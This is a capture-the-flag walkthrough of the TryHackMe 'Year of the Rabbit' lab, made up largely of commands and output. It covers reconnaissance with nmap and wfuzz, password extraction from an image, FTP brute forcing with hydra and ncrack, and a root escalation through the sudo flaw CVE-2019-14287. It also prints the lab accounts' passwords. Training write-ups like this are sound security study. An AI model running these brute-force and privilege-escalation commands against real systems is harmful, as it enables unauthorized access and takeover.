# TryHackMe-Year of The Rabbit

**Scope:**

- SUDO
- FTP
- BrainFuck Programming Language

**Keywords:**

- Image Analysis
- Hidden Pages,
- BrainFuck Decoding
- Password Brute Force
- SUDO Version Vulnerability
- FTP Access Methods

**Main Commands:**

- `nmap -sS -sV -sC -T4 -A -O -oN nmap_result.txt -Pn $target_ip`
- `nmap -sS -Pn -p 21 -T4 -A -oN nmap_ftp_result.txt --script=ftp-anon $target_ip`
- `nmap --script ftp-* -p 21 -T4 -A -Pn -oN nmap_result_ftp_general.txt $target_ip`
- `wget -m ftp://anonymous:anonymous@yearoftherabbit.thm`
- `openssl s_client -connect yearoftherabbit.thm:21 -starttls ftp`
- `wfuzz -w /usr/share/wordlists/dirb/common.txt --hc 404,403,500,501,502,503 -c -t 50 http://yearoftherabbit.thm/FUZZ`
- `strings -n 6 Hot_Babe.png`
- `sed -n '1792,$p' Hot_Babe.png > password_ftp_user.txt`
- `hydra -l ftpuser -P password_ftp_user.txt -t4 -f ftp://yearoftherabbit.thm`
- `ncrack -u ftpuser -P password_ftp_user.txt ftp://yearoftherabbit.thm`
- `ftp yearoftherabbit.thm -p 21`
- `ssh -o MACs=hmac-sha2-256 eli@yearoftherabbit.thm -p 22`
- `ssh -o MACs=hmac-sha2-256 gwendoline@yearoftherabbit.thm -p 22`

**System Commands:**

- `mget *`
- `whoami`
- `find / -name "*s3cr3t*" 2>/dev/null`
- `sudo --version`
- `sudo -l`
- `sudo -u#-1 /usr/bin/vi /home/gwendoline/user.txt`

### Laboratory Environment

[Year of the Rabbit](https://tryhackme.com/r/room/yearoftherabbit)

### Penetration Approaches and Commands

> **Network Enumeration Phase**
> 

`nmap -sS -sV -sC -T4 -A -O -oN nmap_result.txt -Pn $target_ip`

```bash
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.2
22/tcp open  ssh     OpenSSH 6.7p1 Debian 5 (protocol 2.0)
| ssh-hostkey: 
|   1024 a0:8b:6b:78:09:39:03:32:ea:52:4c:20:3e:82:ad:60 (DSA)
|   2048 df:25:d0:47:1f:37:d9:18:81:87:38:76:30:92:65:1f (RSA)
|   256 be:9f:4f:01:4a:44:c8:ad:f5:03:cb:00:ac:8f:49:44 (ECDSA)
|_  256 db:b1:c1:b9:cd:8c:9d:60:4f:f1:98:e2:99:fe:08:03 (ED25519)
80/tcp open  http    Apache httpd 2.4.10 ((Debian))
|_http-server-header: Apache/2.4.10 (Debian)
|_http-title: Apache2 Debian Default Page: It works
```

`nmap -sS -Pn -p 21 -T4 -A -oN nmap_ftp_result.txt --script=ftp-anon $target_ip`

```bash
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.2
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 5.4 (95%), Linux 3.10 - 3.13 (95%), ASUS RT-N56U WAP (Linux 3.4) (95%), Linux 3.16 (95%), Linux 3.1 (93%), Linux 3.2 (93%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (93%), Linux 3.2 - 3.16 (93%), Linux 3.2 - 4.9 (93%), Linux 3.8 - 4.14 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
Service Info: OS: Unix
```

`nmap --script ftp-* -p 21 -T4 -A -Pn -oN nmap_result_ftp_general.txt $target_ip`

```bash
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.2
| ftp-brute: 
|   Accounts: No valid accounts found
|_  Statistics: Performed 1251 guesses in 302 seconds, average tps: 3.8
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 5.4 (95%), Linux 3.10 - 3.13 (95%), ASUS RT-N56U WAP (Linux 3.4) (95%), Linux 3.16 (95%), Linux 3.1 (93%), Linux 3.2 (93%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (93%), Sony Android TV (Android 5.0) (93%), Android 5.0 - 6.0.1 (Linux 3.4) (93%), Android 5.1 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
Service Info: OS: Unix

```

`wget -m ftp://anonymous:anonymous@yearoftherabbit.thm`

```bash
--2024-09-12 06:51:40--  ftp://anonymous:*password*@yearoftherabbit.thm/
           => ‘yearoftherabbit.thm/.listing’
Resolving yearoftherabbit.thm (yearoftherabbit.thm)... 10.10.118.156
Connecting to yearoftherabbit.thm (yearoftherabbit.thm)|10.10.118.156|:21... connected.
Logging in as anonymous ... 
Login incorrect
```

`openssl s_client -connect yearoftherabbit.thm:21 -starttls ftp`

```bash
Connecting to 10.10.118.156
CONNECTED(00000003)
80269A7D227F0000:error:0A00010B:SSL routines:tls_validate_record_header:wrong version number:../ssl/record/methods/tlsany_meth.c:80:
---
no peer certificate available
---
No client certificate CA names sent
---
SSL handshake has read 63 bytes and written 476 bytes
Verification: OK
---
New, (NONE), Cipher is (NONE)
This TLS version forbids renegotiation.
Compression: NONE
Expansion: NONE
No ALPN negotiated
Early data was not sent
Verify return code: 0 (ok)
---
```

> **HTTP Port Check**
> 

`curl -iLX GET http://yearoftherabbit.thm`

```bash
HTTP/1.1 200 OK
Date: Thu, 12 Sep 2024 10:52:30 GMT
Server: Apache/2.4.10 (Debian)
Last-Modified: Thu, 23 Jan 2020 00:34:26 GMT
ETag: "1ead-59cc3cda1f3a4"
Accept-Ranges: bytes
Content-Length: 7853
Vary: Accept-Encoding
Content-Type: text/html
```

> **Directory Scan & Endpoint Control**
> 

`wfuzz -w /usr/share/wordlists/dirb/common.txt --hc 404,403,500,501,502,503 -c -t 50 http://yearoftherabbit.thm/FUZZ`

```bash
000000001:   200        189 L    643 W      7853 Ch     "http://yearoftherabbit.thm/"                                                    
000000499:   301        9 L      28 W       327 Ch      "assets"                                                                         
000002020:   200        189 L    643 W      7853 Ch     "index.html"
```

`curl -iLX GET http://yearoftherabbit.thm/assets`

```bash
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<html>
 <head>
  <title>Index of /assets</title>
 </head>
 <body>
<h1>Index of /assets</h1>
  <table>
   <tr><th valign="top"><img src="/icons/blank.gif" alt="[ICO]"></th><th><a href="?C=N;O=D">Name</a></th><th><a href="?C=M;O=A">Last modified</a></th><th><a href="?C=S;O=A">Size</a></th><th><a href="?C=D;O=A">Description</a></th></tr>
   <tr><th colspan="5"><hr></th></tr>
<tr><td valign="top"><img src="/icons/back.gif" alt="[PARENTDIR]"></td><td><a href="/">Parent Directory</a></td><td>&nbsp;</td><td align="right">  - </td><td>&nbsp;</td></tr>
<tr><td valign="top"><img src="/icons/movie.gif" alt="[VID]"></td><td><a href="RickRolled.mp4">RickRolled.mp4</a></td><td align="right">2020-01-23 00:34  </td><td align="right">384M</td><td>&nbsp;</td></tr>
<tr><td valign="top"><img src="/icons/text.gif" alt="[TXT]"></td><td><a href="style.css">style.css</a></td><td align="right">2020-01-23 00:34  </td><td align="right">2.9K</td><td>&nbsp;</td></tr>
   <tr><th colspan="5"><hr></th></tr>
</table>
<address>Apache/2.4.10 (Debian) Server at yearoftherabbit.thm Port 80</address>
</body></html>
```

`curl -iLX GET http://yearoftherabbit.thm/assets/style.css`

```bash
  /* Nice to see someone checking the stylesheets.
     Take a look at the page: /sup3r_s3cr3t_fl4g.php
  */
```

`wget http://yearoftherabbit.thm/sup3r_s3cr3t_fl4g.php`

```bash
Connecting to yearoftherabbit.thm (yearoftherabbit.thm)|10.10.118.156|:80... connected.
HTTP request sent, awaiting response... 302 Found
Location: intermediary.php?hidden_directory=/WExYY2Cv-qU [following]
--2024-09-12 07:00:18--  http://yearoftherabbit.thm/intermediary.php?hidden_directory=/WExYY2Cv-qU
Reusing existing connection to yearoftherabbit.thm:80.
HTTP request sent, awaiting response... 302 Found
Location: /sup3r_s3cret_fl4g [following]
--2024-09-12 07:00:18--  http://yearoftherabbit.thm/sup3r_s3cret_fl4g
Reusing existing connection to yearoftherabbit.thm:80.
HTTP request sent, awaiting response... 301 Moved Permanently
Location: http://yearoftherabbit.thm/sup3r_s3cret_fl4g/ [following]
--2024-09-12 07:00:19--  http://yearoftherabbit.thm/sup3r_s3cret_fl4g/
Reusing existing connection to yearoftherabbit.thm:80.
HTTP request sent, awaiting response... 200 OK
```

`curl -iLX GET http://yearoftherabbit.thm/WExYY2Cv-qU`

```bash
<tr><td valign="top"><img src="/icons/back.gif" alt="[PARENTDIR]"></td><td><a href="/">Parent Directory</a></td><td>&nbsp;</td><td align="right">  - </td><td>&nbsp;</td></tr>
<tr><td valign="top"><img src="/icons/image2.gif" alt="[IMG]"></td><td><a href="Hot_Babe.png">Hot_Babe.png</a></td><td align="right">2020-01-23 00:34  </td><td align="right">464K</td><td>&nbsp;</td></tr>
   <tr><th colspan="5"><hr></th></tr>
```

> **Image Analysis Phase & Password Wordlist**
> 

`wget http://yearoftherabbit.thm/WExYY2Cv-qU/Hot_Babe.png`

```bash
Hot_Babe.png                         100%[====================================================================>] 463.94K   157KB/s    in 3.0s    

2024-09-12 07:02:32 (157 KB/s) - ‘Hot_Babe.png’ saved [475075/475075]
```

`strings -n 6 Hot_Babe.png`

```bash
Eh, you've earned this. Username for FTP is ftpuser
One of these is the password:
Mou+56n%QK8sr
1618B0AUshw1M
A56IpIl%1s02u
vTFbDzX9&Nmu?
FfF~sfu^UQZmT
8FF?iKO27b~V0
ua4W~2-@y7dE$
3j39aMQQ7xFXT
Wb4--CTc4ww*-
u6oY9?nHv84D&
0iBp4W69Gr_Yf
TS*%miyPsGV54
C77O3FIy0c0sd
O14xEhgg0Hxz1
5dpv#Pr$wqH7F
1G8Ucoce1+gS5
0plnI%f0~Jw71
0kLoLzfhqq8u&
kS9pn5yiFGj6d
zeff4#!b5Ib_n
rNT4E4SHDGBkl

[REDACTED] - MORE
```

`sed -n '1792,$p' Hot_Babe.png > password_ftp_user.txt`

```bash
Mou+56n%QK8sr
1618B0AUshw1M
A56IpIl%1s02u
vTFbDzX9&Nmu?
FfF~sfu^UQZmT
8FF?iKO27b~V0
ua4W~2-@y7dE$
3j39aMQQ7xFXT
Wb4--CTc4ww*-
u6oY9?nHv84D&
0iBp4W69Gr_Yf
TS*%miyPsGV54
C77O3FIy0c0sd
O14xEhgg0Hxz1
5dpv#Pr$wqH7F
1G8Ucoce1+gS5
0plnI%f0~Jw71
0kLoLzfhqq8u&
kS9pn5yiFGj6d
zeff4#!b5Ib_n
rNT4E4SHDGBkl

[REDACTED] - MORE
```

> **FTP Password Brute Force**
> 

`hydra -l ftpuser -P password_ftp_user.txt -t4 -f ftp://yearoftherabbit.thm`

```bash
[21][ftp] host: yearoftherabbit.thm   login: ftpuser   password: 5iez1wGXKfPKQ
```

`ncrack -u ftpuser -P password_ftp_user.txt ftp://yearoftherabbit.thm`

```bash
10.10.118.156 21/tcp ftp: 'ftpuser' '5iez1wGXKfPKQ'
```

> **FTP Connection**
> 

`ftp yearoftherabbit.thm -p 21`

```bash
Connected to yearoftherabbit.thm.
220 (vsFTPd 3.0.2)
Name (yearoftherabbit.thm:root): ftpuser
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> dir
229 Entering Extended Passive Mode (|||40890|).
150 Here comes the directory listing.
-rw-r--r--    1 0        0             758 Jan 23  2020 Eli's_Creds.txt
226 Directory send OK.
ftp> mget *
mget Eli's_Creds.txt [anpqy?]? y
229 Entering Extended Passive Mode (|||41974|).
150 Opening BINARY mode data connection for Eli's_Creds.txt (758 bytes).
100% |*****************************************************************************************************|   758        2.11 MiB/s    00:00 ETA
226 Transfer complete.
758 bytes received in 00:00 (2.10 KiB/s)
ftp> 
```

`cat "Eli's_Creds.txt" | head`

```bash
+++++ ++++[ ->+++ +++++ +<]>+ +++.< +++++ [->++ +++<] >++++ +.<++ +[->-
--<]> ----- .<+++ [->++ +<]>+ +++.< +++++ ++[-> ----- --<]> ----- --.<+
++++[ ->--- --<]> -.<++ +++++ +[->+ +++++ ++<]> +++++ .++++ +++.- --.<+
+++++ +++[- >---- ----- <]>-- ----- ----. ---.< +++++ +++[- >++++ ++++<
]>+++ +++.< ++++[ ->+++ +<]>+ .<+++ +[->+ +++<] >++.. ++++. ----- ---.+
++.<+ ++[-> ---<] >---- -.<++ ++++[ ->--- ---<] >---- --.<+ ++++[ ->---
--<]> -.<++ ++++[ ->+++ +++<] >.<++ +[->+ ++<]> +++++ +.<++ +++[- >++++
+<]>+ +++.< +++++ +[->- ----- <]>-- ----- -.<++ ++++[ ->+++ +++<] >+.<+
++++[ ->--- --<]> ---.< +++++ [->-- ---<] >---. <++++ ++++[ ->+++ +++++
<]>++ ++++. <++++ +++[- >---- ---<] >---- -.+++ +.<++ +++++ [->++ +++++
```

> **Brainfuck Decoding Phase**
> 

**BrainFuck Full Code:**

```bash
+++++ ++++[ ->+++ +++++ +<]>+ +++.< +++++ [->++ +++<] >++++ +.<++ +[->- --<]> ----- .<+++ [->++ +<]>+ +++.< +++++ ++[-> ----- --<]> ----- --.<+ ++++[ ->--- --<]> -.<++ +++++ +[->+ +++++ ++<]> +++++ .++++ +++.- --.<+ +++++ +++[- >---- ----- <]>-- ----- ----. ---.< +++++ +++[- >++++ ++++< ]>+++ +++.< ++++[ ->+++ +<]>+ .<+++ +[->+ +++<] >++.. ++++. ----- ---.+ ++.<+ ++[-> ---<] >---- -.<++ ++++[ ->--- ---<] >---- --.<+ ++++[ ->--- --<]> -.<++ ++++[ ->+++ +++<] >.<++ +[->+ ++<]> +++++ +.<++ +++[- >++++ +<]>+ +++.< +++++ +[->- ----- <]>-- ----- -.<++ ++++[ ->+++ +++<] >+.<+ ++++[ ->--- --<]> ---.< +++++ [->-- ---<] >---. <++++ ++++[ ->+++ +++++ <]>++ ++++. <++++ +++[- >---- ---<] >---- -.+++ +.<++ +++++ [->++ +++++ <]>+. <+++[ ->--- <]>-- ---.- ----. <
```

**Use for decoding:**

[Brainfuck](https://www.dcode.fr/brainfuck-language)

**Decoded string:**

```bash
User: eli
Password: DSpDiM1wAEwid
```

> **SSH Connection & System Discovery Phase**
> 

`ssh -o MACs=hmac-sha2-256 eli@yearoftherabbit.thm -p 22`

```bash
eli@yearoftherabbit.thm's password: 

1 new message
Message from Root to Gwendoline:

"Gwendoline, I am not happy with you. Check our leet s3cr3t hiding place. I've left you a hidden message there"

END MESSAGE

eli@year-of-the-rabbit:~$ whoami
eli
eli@year-of-the-rabbit:~$ pwd
/home/eli
eli@year-of-the-rabbit:~$ find / -name "*s3cr3t*" 2>/dev/null
/var/www/html/sup3r_s3cr3t_fl4g.php
/usr/games/s3cr3t
eli@year-of-the-rabbit:~$ ls -lsa /usr/games/s3cr3t
total 12
4 drwxr-xr-x 2 root root 4096 Jan 23  2020 .
4 drwxr-xr-x 3 root root 4096 Jan 23  2020 ..
4 -rw-r--r-- 1 root root  138 Jan 23  2020 .th1s_m3ss4ag3_15_f0r_gw3nd0l1n3_0nly!
eli@year-of-the-rabbit:~$ cat /usr/games/s3cr3t/.th1s_m3ss4ag3_15_f0r_gw3nd0l1n3_0nly!
Your password is awful, Gwendoline. 
It should be at least 60 characters long! Not just MniVCQVhQHUNI
Honestly!

Yours sincerely
   -Root
```

`ssh -o MACs=hmac-sha2-256 gwendoline@yearoftherabbit.thm -p 22`

```bash
gwendoline@yearoftherabbit.thm's password: 

1 new message
Message from Root to Gwendoline:

"Gwendoline, I am not happy with you. Check our leet s3cr3t hiding place. I've left you a hidden message there"

END MESSAGE

gwendoline@year-of-the-rabbit:~$ whoami
gwendoline
gwendoline@year-of-the-rabbit:~$ pwd
/home/gwendoline
gwendoline@year-of-the-rabbit:~$ id
uid=1001(gwendoline) gid=1001(gwendoline) groups=1001(gwendoline)
gwendoline@year-of-the-rabbit:~$ 

```

> **SUDO Vulnerability & Privilege Escalation with VI**
> 

```bash
gwendoline@year-of-the-rabbit:~$ sudo --version
Sudo version 1.8.10p3
Sudoers policy plugin version 1.8.10p3
Sudoers file grammar version 43
Sudoers I/O plugin version 1.8.10p3
```

**Check for SUDO vulnerability:**

[CVE-2019-14287 - Sudo Vulnerability Cheat Sheet](https://resources.whitesourcesoftware.com/blog-whitesource/new-vulnerability-in-sudo-cve-2019-14287)

[NVD - CVE-2019-14287](https://nvd.nist.gov/vuln/detail/CVE-2019-14287)

[CVE -
CVE-2019-14287](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-14287)

```bash
gwendoline@year-of-the-rabbit:~$ sudo -l
Matching Defaults entries for gwendoline on year-of-the-rabbit:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User gwendoline may run the following commands on year-of-the-rabbit:
    (ALL, !root) NOPASSWD: /usr/bin/vi /home/gwendoline/user.txt
```

```bash
gwendoline@year-of-the-rabbit:~$ sudo -u#-1 /usr/bin/vi /home/gwendoline/user.txt

[REDACTED] - VI INTERFACE
```

```bash
# whoami
root
# id
uid=0(root) gid=0(root) groups=0(root)
# 
```

# Appendix

## SUDO

<aside>
💡

sudo in Linux stands for "superuser do" and is a command that allows a permitted user to execute commands as the superuser (or another user) with elevated privileges. By default, when you run a command with sudo, it is executed with the privileges of the root user (the superuser). The root user has unrestricted access to all files and commands on the system. When a user runs a command with `sudo`, they temporarily escalate their privileges. This is useful for performing administrative tasks without logging in as the root user.

</aside>

## BRAINFUCK

<aside>
💡

Brainfuck is an esoteric programming language known for its extreme minimalism and challenging syntax. It was created by Urban Müller in 1993 with the goal of designing a language with the smallest possible compiler size while still being Turing complete, meaning it can theoretically perform any computation given enough time and memory. Brainfuck is more of a brain teaser or puzzle than a practical programming language. Programmers use it to challenge themselves or for fun, trying to write complex programs in the most minimalistic way possible.

</aside>

## FTP (File Transfer Protocol)

<aside>
💡

FTP (File Transfer Protocol) is a standard network protocol used to transfer files between a client and a server over a TCP-based network, such as the internet. It allows users to upload, download, delete, rename, move, and copy files on a server. FTP follows a client-server model where a client connects to an FTP server to perform file operations. The server hosts the files, while the client accesses the files through commands. The client and server establish a control connection on port 21. This connection is used to send FTP commands and responses (e.g., to change directories or list files). When a file transfer occurs, a separate data connection is established, typically on port 20 or dynamically chosen ports. The actual file data is sent over this connection.

</aside>